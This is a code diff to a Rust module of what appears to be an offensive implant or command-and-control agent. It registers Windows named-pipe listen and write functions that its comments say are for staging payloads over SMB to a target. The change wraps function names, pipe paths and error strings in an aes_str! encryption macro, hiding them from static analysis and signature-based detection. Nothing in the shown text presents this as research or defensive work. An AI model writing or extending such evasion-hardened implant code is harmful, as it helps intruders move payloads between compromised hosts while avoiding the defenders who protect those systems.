@@ -1,5 +1,7 @@
 // src/agent/scripting/pipes.rs
 use rhai::Engine;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
@@ -7,17 +9,17 @@ pub fn register(engine: &mut Engine) {
     // read up to 64 KB, and return the data as hex.
     // Use for staging payloads over SMB (\\target\pipe\name).
     // Windows only - returns descriptive error on other platforms.
-    engine.register_fn("internal_named_pipe_listen", |name: &str, timeout_ms: i64| -> String {
+    engine.register_fn(&aes_str!("internal_named_pipe_listen"), |name: &str, timeout_ms: i64| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             let pipe_name = format!(
                 "\\\\.\\pipe\\{}",
-                name.trim_start_matches("\\\\.\\pipe\\"),
+                name.trim_start_matches(&aes_str!("\\\\.\\pipe\\")),
             );
             let cname = match CString::new(pipe_name.as_bytes()) {
                 Ok(s)  => s,
-                Err(_) => return "Error: invalid pipe name".into(),
+                Err(_) => return aes_str!("Error: invalid pipe name"),
             };
             unsafe {
                 use super::win_ffi::win_ext::*;
@@ -52,7 +54,7 @@ pub fn register(engine: &mut Engine) {
 
     // Connect to an existing named pipe as a client and write hex-encoded data.
     // Windows only - returns descriptive error on other platforms.
-    engine.register_fn("internal_named_pipe_write", |name: &str, data_hex: &str| -> String {
+    engine.register_fn(&aes_str!("internal_named_pipe_write"), |name: &str, data_hex: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
@@ -62,11 +64,11 @@ pub fn register(engine: &mut Engine) {
             };
             let pipe_name = format!(
                 "\\\\.\\pipe\\{}",
-                name.trim_start_matches("\\\\.\\pipe\\"),
+                name.trim_start_matches(&aes_str!("\\\\.\\pipe\\")),
             );
             let cname = match CString::new(pipe_name.as_bytes()) {
                 Ok(s)  => s,
-                Err(_) => return "Error: invalid pipe name".into(),
+                Err(_) => return aes_str!("Error: invalid pipe name"),
             };
             unsafe {
                 use super::win_ffi::win_ext::*;
